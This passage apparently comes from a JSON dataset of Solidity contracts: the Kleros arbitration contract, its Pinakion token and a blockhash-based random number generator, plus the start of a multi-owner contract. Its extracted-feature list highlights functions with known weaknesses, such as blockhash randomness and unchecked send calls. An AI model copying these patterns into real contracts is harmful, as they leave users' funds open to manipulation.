name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n Pinakion public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function Pinakion(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = Pinakion(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n Pinakion cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n Pinakion token = Pinakion(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (Pinakion) {\n Pinakion newToken = new Pinakion(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract RNG{\n function contribute(uint _block) public payable;\n function requestRN(uint _block) public payable {\n contribute(_block);\n }\n function getRN(uint _block) public returns (uint RN);\n function getUncorrelatedRN(uint _block) public returns (uint RN) {\n uint baseRN=getRN(_block);\n if (baseRN==0)\n return 0;\n else\n return uint(keccak256(msg.sender,baseRN));\n }\n }\ncontract BlockHashRNG is RNG {\n mapping (uint => uint) public randomNumber;\n mapping (uint => uint) public reward;\n function contribute(uint _block) public payable { reward[_block]+=msg.value; }\n function getRN(uint _block) public returns (uint RN) {\n RN=randomNumber[_block];\n if (RN==0){\n saveRN(_block);\n return randomNumber[_block];\n }\n else\n return RN;\n }\n function saveRN(uint _block) public {\n if (blockhash(_block) != 0x0)\n randomNumber[_block] = uint(blockhash(_block));\n if (randomNumber[_block] != 0) {\n uint rewardToSend = reward[_block];\n reward[_block] = 0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract BlockHashRNGFallback is BlockHashRNG {\n function saveRN(uint _block) public {\n if (_block<block.number && randomNumber[_block]==0) {\n if (blockhash(_block)!=0x0)\n randomNumber[_block]=uint(blockhash(_block));\n else\n randomNumber[_block]=uint(blockhash(block.number-1));\n }\n if (randomNumber[_block] != 0) {\n uint rewardToSend=reward[_block];\n reward[_block]=0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract Arbitrable{\n Arbitrator public arbitrator;\n bytes public arbitratorExtraData;\n modifier onlyArbitrator {require(msg.sender==address(arbitrator)); _;}\n event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling);\n event MetaEvidence(uint indexed _metaEvidenceID, string _evidence);\n event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID);\n event Evidence(Arbitrator indexed _arbitrator, uint indexed _disputeID, address _party, string _evidence);\n constructor(Arbitrator _arbitrator, bytes _arbitratorExtraData) public {\n arbitrator = _arbitrator;\n arbitratorExtraData = _arbitratorExtraData;\n }\n function rule(uint _disputeID, uint _ruling) public onlyArbitrator {\n emit Ruling(Arbitrator(msg.sender),_disputeID,_ruling);\n executeRuling(_disputeID,_ruling);\n }\n function executeRuling(uint _disputeID, uint _ruling) internal;\n}\ncontract Arbitrator{\n enum DisputeStatus {Waiting, Appealable, Solved}\n modifier requireArbitrationFee(bytes _extraData) {require(msg.value>=arbitrationCost(_extraData)); _;}\n modifier requireAppealFee(uint _disputeID, bytes _extraData) {require(msg.value>=appealCost(_disputeID, _extraData)); _;}\n event AppealPossible(uint _disputeID);\n event DisputeCreation(uint indexed _disputeID, Arbitrable _arbitrable);\n event AppealDecision(uint indexed _disputeID, Arbitrable _arbitrable);\n function createDispute(uint _choices, bytes _extraData) public requireArbitrationFee(_extraData) payable returns(uint disputeID) {}\n function arbitrationCost(bytes _extraData) public constant returns(uint fee);\n function appeal(uint _disputeID, bytes _extraData) public requireAppealFee(_disputeID,_extraData) payable {\n emit AppealDecision(_disputeID, Arbitrable(msg.sender));\n }\n function appealCost(uint _disputeID, bytes _extraData) public constant returns(uint fee);\n function disputeStatus(uint _disputeID) public constant returns(DisputeStatus status);\n function currentRuling(uint _disputeID) public constant returns(uint ruling);\n}\ncontract Kleros is Arbitrator, ApproveAndCallFallBack {\n Pinakion public pinakion;\n uint public constant NON_PAYABLE_AMOUNT = (2**256 - 2) / 2;\n RNG public rng;\n uint public arbitrationFeePerJuror = 0.05 ether;\n uint16 public defaultNumberJuror = 3;\n uint public minActivatedToken = 0.1 * 1e18;\n uint[5] public timePerPeriod;\n uint public alpha = 2000;\n uint constant ALPHA_DIVISOR = 1e4;\n uint public maxAppeals = 5;\n address public governor;\n uint public session = 1;\n uint public lastPeriodChange;\n uint public segmentSize;\n uint public rnBlock;\n uint public randomNumber;\n enum Period {\n Activation,\n Draw,\n Vote,\n Appeal,\n Execution\n }\n Period public period;\n struct Juror {\n uint balance;\n uint atStake;\n uint lastSession;\n uint segmentStart;\n uint segmentEnd;\n }\n mapping (address => Juror) public jurors;\n struct Vote {\n address account;\n uint ruling;\n }\n struct VoteCounter {\n uint winningChoice;\n uint winningCount;\n mapping (uint => uint) voteCount;\n }\n enum DisputeState {\n Open,\n Resolving,\n Executable,\n Executed\n }\n struct Dispute {\n Arbitrable arbitrated;\n uint session;\n uint appeals;\n uint choices;\n uint16 initialNumberJurors;\n uint arbitrationFeePerJuror;\n DisputeState state;\n Vote[][] votes;\n VoteCounter[] voteCounter;\n mapping (address => uint) lastSessionVote;\n uint currentAppealToRepartition;\n AppealsRepartitioned[] appealsRepartitioned;\n }\n enum RepartitionStage {\n Incoherent,\n Coherent,\n AtStake,\n Complete\n }\n struct AppealsRepartitioned {\n uint totalToRedistribute;\n uint nbCoherent;\n uint currentIncoherentVote;\n uint currentCoherentVote;\n uint currentAtStakeVote;\n RepartitionStage stage;\n }\n Dispute[] public disputes;\n event NewPeriod(Period _period, uint indexed _session);\n event TokenShift(address indexed _account, uint _disputeID, int _amount);\n event ArbitrationReward(address indexed _account, uint _disputeID, uint _amount);\n modifier onlyBy(address _account) {require(msg.sender == _account); _;}\n modifier onlyDuring(Period _period) {require(period == _period); _;}\n modifier onlyGovernor() {require(msg.sender == governor); _;}\n constructor(Pinakion _pinakion, RNG _rng, uint[5] _timePerPeriod, address _governor) public {\n pinakion = _pinakion;\n rng = _rng;\n lastPeriodChange = now;\n timePerPeriod = _timePerPeriod;\n governor = _governor;\n }\n function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) {\n require(pinakion.transferFrom(_from, this, _amount));\n jurors[_from].balance += _amount;\n }\n function withdraw(uint _value) public {\n Juror storage juror = jurors[msg.sender];\n require(juror.atStake <= juror.balance);\n require(_value <= juror.balance-juror.atStake);\n require(juror.lastSession != session);\n juror.balance -= _value;\n require(pinakion.transfer(msg.sender,_value));\n }\n function passPeriod() public {\n require(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\n if (period == Period.Activation) {\n rnBlock = block.number + 1;\n rng.requestRN(rnBlock);\n period = Period.Draw;\n } else if (period == Period.Draw) {\n randomNumber = rng.getUncorrelatedRN(rnBlock);\n require(randomNumber != 0);\n period = Period.Vote;\n } else if (period == Period.Vote) {\n period = Period.Appeal;\n } else if (period == Period.Appeal) {\n period = Period.Execution;\n } else if (period == Period.Execution) {\n period = Period.Activation;\n ++session;\n segmentSize = 0;\n rnBlock = 0;\n randomNumber = 0;\n }\n lastPeriodChange = now;\n NewPeriod(period, session);\n }\n function activateTokens(uint _value) public onlyDuring(Period.Activation) {\n Juror storage juror = jurors[msg.sender];\n require(_value <= juror.balance);\n require(_value >= minActivatedToken);\n require(juror.lastSession != session);\n juror.lastSession = session;\n juror.segmentStart = segmentSize;\n segmentSize += _value;\n juror.segmentEnd = segmentSize;\n }\n function voteRuling(uint _disputeID, uint _ruling, uint[] _draws) public onlyDuring(Period.Vote) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[msg.sender];\n VoteCounter storage voteCounter = dispute.voteCounter[dispute.appeals];\n require(dispute.lastSessionVote[msg.sender] != session);\n require(_ruling <= dispute.choices);\n require(validDraws(msg.sender, _disputeID, _draws));\n dispute.lastSessionVote[msg.sender] = session;\n voteCounter.voteCount[_ruling] += _draws.length;\n if (voteCounter.winningCount < voteCounter.voteCount[_ruling]) {\n voteCounter.winningCount = voteCounter.voteCount[_ruling];\n voteCounter.winningChoice = _ruling;\n } else if (voteCounter.winningCount==voteCounter.voteCount[_ruling] && _draws.length!=0) {\n voteCounter.winningChoice = 0;\n }\n for (uint i = 0; i < _draws.length; ++i) {\n dispute.votes[dispute.appeals].push(Vote({\n account: msg.sender,\n ruling: _ruling\n }));\n }\n juror.atStake += _draws.length * getStakePerDraw();\n uint feeToPay = _draws.length * dispute.arbitrationFeePerJuror;\n msg.sender.transfer(feeToPay);\n ArbitrationReward(msg.sender, _disputeID, feeToPay);\n }\n function penalizeInactiveJuror(address _jurorAddress, uint _disputeID, uint[] _draws) public {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage inactiveJuror = jurors[_jurorAddress];\n require(period > Period.Vote);\n require(dispute.lastSessionVote[_jurorAddress] != session);\n dispute.lastSessionVote[_jurorAddress] = session;\n require(validDraws(_jurorAddress, _disputeID, _draws));\n uint penality = _draws.length * minActivatedToken * 2 * alpha / ALPHA_DIVISOR;\n penality = (penality < inactiveJuror.balance) ? penality : inactiveJuror.balance;\n inactiveJuror.balance -= penality;\n TokenShift(_jurorAddress, _disputeID, -int(penality));\n jurors[msg.sender].balance += penality / 2;\n TokenShift(msg.sender, _disputeID, int(penality / 2));\n jurors[governor].balance += penality / 2;\n TokenShift(governor, _disputeID, int(penality / 2));\n msg.sender.transfer(_draws.length*dispute.arbitrationFeePerJuror);\n }\n function oneShotTokenRepartition(uint _disputeID) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state == DisputeState.Open);\n require(dispute.session+dispute.appeals <= session);\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n for (uint i = 0; i <= dispute.appeals; ++i) {\n if (winningChoice!=0 || (dispute.voteCounter[dispute.appeals].voteCount[0] == dispute.voteCounter[dispute.appeals].winningCount)) {\n uint totalToRedistribute = 0;\n uint nbCoherent = 0;\n for (uint j = 0; j < dispute.votes[i].length; ++j) {\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n totalToRedistribute += penalty;\n } else {\n ++nbCoherent;\n }\n }\n if (nbCoherent == 0) {\n jurors[governor].balance += totalToRedistribute;\n TokenShift(governor, _disputeID, int(totalToRedistribute));\n } else {\n uint toRedistribute = totalToRedistribute / nbCoherent;\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n }\n }\n }\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function multipleShotTokenRepartition(uint _disputeID, uint _maxIterations) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state <= DisputeState.Resolving);\n require(dispute.session+dispute.appeals <= session);\n dispute.state = DisputeState.Resolving;\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n uint currentIterations = 0;\n for (uint i = dispute.currentAppealToRepartition; i <= dispute.appeals; ++i) {\n if (dispute.appealsRepartitioned.length < i+1) {\n dispute.appealsRepartitioned.length++;\n }\n if (winningChoice==0 && (dispute.voteCounter[dispute.appeals].voteCount[0] != dispute.voteCounter[dispute.appeals].winningCount)) {\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Incoherent) {\n for (uint j = dispute.appealsRepartitioned[i].currentIncoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n dispute.appealsRepartitioned[i].totalToRedistribute += penalty;\n } else {\n ++dispute.appealsRepartitioned[i].nbCoherent;\n }\n ++dispute.appealsRepartitioned[i].currentIncoherentVote;\n ++currentIterations;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Coherent;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Coherent) {\n if (dispute.appealsRepartitioned[i].nbCoherent == 0) {\n jurors[governor].balance += dispute.appealsRepartitioned[i].totalToRedistribute;\n TokenShift(governor, _disputeID, int(dispute.appealsRepartitioned[i].totalToRedistribute));\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n } else {\n uint toRedistribute = dispute.appealsRepartitioned[i].totalToRedistribute / dispute.appealsRepartitioned[i].nbCoherent;\n for (j = dispute.appealsRepartitioned[i].currentCoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentCoherentVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.AtStake) {\n for (j = dispute.appealsRepartitioned[i].currentAtStakeVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentAtStakeVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Complete;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Complete) {\n ++dispute.currentAppealToRepartition;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function amountJurors(uint _disputeID) public view returns (uint nbJurors) {\n Dispute storage dispute = disputes[_disputeID];\n return (dispute.initialNumberJurors + 1) * 2**dispute.appeals - 1;\n }\n function validDraws(address _jurorAddress, uint _disputeID, uint[] _draws) public view returns (bool valid) {\n uint draw = 0;\n Juror storage juror = jurors[_jurorAddress];\n Dispute storage dispute = disputes[_disputeID];\n uint nbJurors = amountJurors(_disputeID);\n if (juror.lastSession != session) return false;\n if (dispute.session+dispute.appeals != session) return false;\n if (period <= Period.Draw) return false;\n for (uint i = 0; i < _draws.length; ++i) {\n if (_draws[i] <= draw) return false;\n draw = _draws[i];\n if (draw > nbJurors) return false;\n uint position = uint(keccak256(randomNumber, _disputeID, draw)) % segmentSize;\n require(position >= juror.segmentStart);\n require(position < juror.segmentEnd);\n }\n return true;\n }\n function createDispute(uint _choices, bytes _extraData) public payable returns (uint disputeID) {\n uint16 nbJurors = extraDataToNbJurors(_extraData);\n require(msg.value >= arbitrationCost(_extraData));\n disputeID = disputes.length++;\n Dispute storage dispute = disputes[disputeID];\n dispute.arbitrated = Arbitrable(msg.sender);\n if (period < Period.Draw)\n dispute.session = session;\n else\n dispute.session = session+1;\n dispute.choices = _choices;\n dispute.initialNumberJurors = nbJurors;\n dispute.arbitrationFeePerJuror = arbitrationFeePerJuror;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n DisputeCreation(disputeID, Arbitrable(msg.sender));\n return disputeID;\n }\n function appeal(uint _disputeID, bytes _extraData) public payable onlyDuring(Period.Appeal) {\n super.appeal(_disputeID,_extraData);\n Dispute storage dispute = disputes[_disputeID];\n require(msg.value >= appealCost(_disputeID, _extraData));\n require(dispute.session+dispute.appeals == session);\n require(dispute.arbitrated == msg.sender);\n dispute.appeals++;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n }\n function executeRuling(uint disputeID) public {\n Dispute storage dispute = disputes[disputeID];\n require(dispute.state == DisputeState.Executable);\n dispute.state = DisputeState.Executed;\n dispute.arbitrated.rule(disputeID, dispute.voteCounter[dispute.appeals].winningChoice);\n }\n function arbitrationCost(bytes _extraData) public view returns (uint fee) {\n return extraDataToNbJurors(_extraData) * arbitrationFeePerJuror;\n }\n function appealCost(uint _disputeID, bytes _extraData) public view returns (uint fee) {\n Dispute storage dispute = disputes[_disputeID];\n if(dispute.appeals >= maxAppeals) return NON_PAYABLE_AMOUNT;\n return (2*amountJurors(_disputeID) + 1) * dispute.arbitrationFeePerJuror;\n }\n function extraDataToNbJurors(bytes _extraData) internal view returns (uint16 nbJurors) {\n if (_extraData.length < 2)\n return defaultNumberJuror;\n else\n return (uint16(_extraData[0]) << 8) + uint16(_extraData[1]);\n }\n function getStakePerDraw() public view returns (uint minActivatedTokenInAlpha) {\n return (alpha * minActivatedToken) / ALPHA_DIVISOR;\n }\n function getVoteAccount(uint _disputeID, uint _appeals, uint _voteID) public view returns (address account) {\n return disputes[_disputeID].votes[_appeals][_voteID].account;\n }\n function getVoteRuling(uint _disputeID, uint _appeals, uint _voteID) public view returns (uint ruling) {\n return disputes[_disputeID].votes[_appeals][_voteID].ruling;\n }\n function getWinningChoice(uint _disputeID, uint _appeals) public view returns (uint winningChoice) {\n return disputes[_disputeID].voteCounter[_appeals].winningChoice;\n }\n function getWinningCount(uint _disputeID, uint _appeals) public view returns (uint winningCount) {\n return disputes[_disputeID].voteCounter[_appeals].winningCount;\n }\n function getVoteCount(uint _disputeID, uint _appeals, uint _choice) public view returns (uint voteCount) {\n return disputes[_disputeID].voteCounter[_appeals].voteCount[_choice];\n }\n function getLastSessionVote(uint _disputeID, address _juror) public view returns (uint lastSessionVote) {\n return disputes[_disputeID].lastSessionVote[_juror];\n }\n function isDrawn(uint _disputeID, address _juror, uint _draw) public view returns (bool drawn) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[_juror];\n if (juror.lastSession != session\n || (dispute.session+dispute.appeals != session)\n || period<=Period.Draw\n || _draw>amountJurors(_disputeID)\n || _draw==0\n || segmentSize==0\n ) {\n return false;\n } else {\n uint position = uint(keccak256(randomNumber,_disputeID,_draw)) % segmentSize;\n return (position >= juror.segmentStart) && (position < juror.segmentEnd);\n }\n }\n function currentRuling(uint _disputeID) public view returns (uint ruling) {\n Dispute storage dispute = disputes[_disputeID];\n return dispute.voteCounter[dispute.appeals].winningChoice;\n }\n function disputeStatus(uint _disputeID) public view returns (DisputeStatus status) {\n Dispute storage dispute = disputes[_disputeID];\n if (dispute.session+dispute.appeals < session)\n return DisputeStatus.Solved;\n else if(dispute.session+dispute.appeals == session) {\n if (dispute.state == DisputeState.Open) {\n if (period < Period.Appeal)\n return DisputeStatus.Waiting;\n else if (period == Period.Appeal)\n return DisputeStatus.Appealable;\n else return DisputeStatus.Solved;\n } else return DisputeStatus.Solved;\n } else return DisputeStatus.Waiting;\n }\n function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {\n _target.call.value(_value)(_data);\n }\n function setRng(RNG _rng) public onlyGovernor {\n rng = _rng;\n }\n function setArbitrationFeePerJuror(uint _arbitrationFeePerJuror) public onlyGovernor {\n arbitrationFeePerJuror = _arbitrationFeePerJuror;\n }\n function setDefaultNumberJuror(uint16 _defaultNumberJuror) public onlyGovernor {\n defaultNumberJuror = _defaultNumberJuror;\n }\n function setMinActivatedToken(uint _minActivatedToken) public onlyGovernor {\n minActivatedToken = _minActivatedToken;\n }\n function setTimePerPeriod(uint[5] _timePerPeriod) public onlyGovernor {\n timePerPeriod = _timePerPeriod;\n }\n function setAlpha(uint _alpha) public onlyGovernor {\n alpha = _alpha;\n }\n function setMaxAppeals(uint _maxAppeals) public onlyGovernor {\n maxAppeals = _maxAppeals;\n }\n function setGovernor(address _governor) public onlyGovernor {\n governor = _governor;\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}",
    "function saveRN(uint _block) public {\nif (_block<block.number && randomNumber[_block]==0) {\nif (blockhash(_block)!=0x0)\nrandomNumber[_block]=uint(blockhash(_block));\nelse\nrandomNumber[_block]=uint(blockhash(block.number-1));\n}\nif (randomNumber[_block] != 0) {\nuint rewardToSend=reward[_block];\nreward[_block]=0;\nmsg.sender.send(rewardToSend);\n}\n}",
    "function passPeriod() public {\nrequire(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\nif (period == Period.Activation) {\nrnBlock = block.number + 1;\nrng.requestRN(rnBlock);\nperiod = Period.Draw;\n} else if (period == Period.Draw) {\nrandomNumber = rng.getUncorrelatedRN(rnBlock);\nrequire(randomNumber != 0);\nperiod = Period.Vote;\n} else if (period == Period.Vote) {\nperiod = Period.Appeal;\n} else if (period == Period.Appeal) {\nperiod = Period.Execution;\n} else if (period == Period.Execution) {\nperiod = Period.Activation;\n++session;\nsegmentSize = 0;\nrnBlock = 0;\nrandomNumber = 0;\n}\nlastPeriodChange = now;\nNewPeriod(period, session);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b4c"
  },
  "filename": "2506.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract multiowned {\n struct PendingState {\n uint yetNeeded;\n uint ownersDone;\n uint index;\n }\n event Confirmation(address owner, bytes32 operation);\n event Revoke(address owner, bytes32 operation);\n event OwnerChanged(address oldOwner, address newOwner);\n event OwnerAdded(address newOwner);\n event OwnerRemoved(address oldOwner);\n event RequirementChanged(uint newRequirement);\n modifier onlyowner {\n if (isOwner(msg.sender))\n _;\n }\n modifier onlymanyowners(bytes32 _operation) {\n if (confirmAndCheck(_operation))\n _;\n }\n constructor(address[] _owners, uint _required) public {\n m_numOwners = _owners.length;\n for (uint i = 0; i < _owners.length; ++i)\n {\n m_owners[1 + i] = uint(_owners[i]);\n m_ownerIndex[uint(_owners[i])] = 1 + i;\n }\n m_required = _required;\n }\n function revoke(bytes32 _operation) external {\n uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n if (ownerIndex == 0) return;\n uint ownerIndexBit = 2**ownerIndex;\n PendingState storage pending = m_pending[_operation];\n if (pending.ownersDone & ownerIndexBit > 0) {\n pending.yetNeeded++;\n pending.ownersDone -= ownerIndexBit;\n emit Revoke(msg.sender, _operation);\n }\n }\n function changeOwner(address _from, address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n if (isOwner(_to)) return;\n uint ownerIndex = m_ownerIndex[uint(_from)];\n if (ownerIndex == 0) return;\n clearPending();\n m_owners[ownerIndex] = uint(_to);\n m_ownerIndex[uint(_from)] = 0;\n m_ownerIndex[uint(_to)] = ownerIndex;\n emit OwnerChanged(_from, _to);\n }\n function addOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n if (isOwner(_owner)) return;\n 